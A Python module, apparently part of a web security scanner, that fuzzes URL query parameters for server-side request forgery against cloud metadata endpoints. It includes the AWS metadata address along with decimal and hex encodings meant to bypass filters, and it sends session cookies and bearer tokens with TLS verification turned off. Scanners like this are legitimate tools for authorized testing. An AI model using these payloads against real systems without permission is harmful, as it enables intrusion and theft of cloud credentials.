import requests
from scanners.utils import GLOBAL_COOKIE, GLOBAL_BEARER

def run_cloud_ssrf_fuzzer(url):
    """
    Highly targeted Cloud Metadata SSRF fuzzer.
    Injects AWS/GCP internal metadata IPs into URL parameters.
    """
    findings = []
    headers = {}
    if GLOBAL_COOKIE: headers["Cookie"] = GLOBAL_COOKIE
    if GLOBAL_BEARER: headers["Authorization"] = f"Bearer {GLOBAL_BEARER}"

    if "?" not in url:
        return findings
        
    metadata_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://2852039166/latest/meta-data/", # Decimal IP bypass
        "http://0xA9FEA9FE/latest/meta-data/"  # Hex IP bypass
    ]
    
    base_url = url.split("?")[0]
    params_str = url.split("?")[1]
    
    if not params_str: return findings
    
    params = dict(x.split('=') if '=' in x else (x, '') for x in params_str.split('&'))
    
    for key in params.keys():
        for payload in metadata_payloads:
            test_params = params.copy()
            test_params[key] = payload
            try:
                r = requests.get(base_url, params=test_params, headers=headers, timeout=5, verify=False)
                # AWS meta-data signature
                if "ami-id" in r.text and "instance-id" in r.text:
                    findings.append({
                        "type": "CLOUD_METADATA_SSRF",
                        "url": r.url,
                        "severity": "CRITICAL",
                        "confidence": "HIGH",
                        "verified": True,
                        "detail": f"Critical Cloud SSRF! Successfully pulled AWS metadata via parameter `{key}` using payload `{payload}`. Immediate Root AWS Key compromise possible."
                    })
                    return findings # Immediate return to avoid spamming
            except Exception: 
                pass
            
    return findings
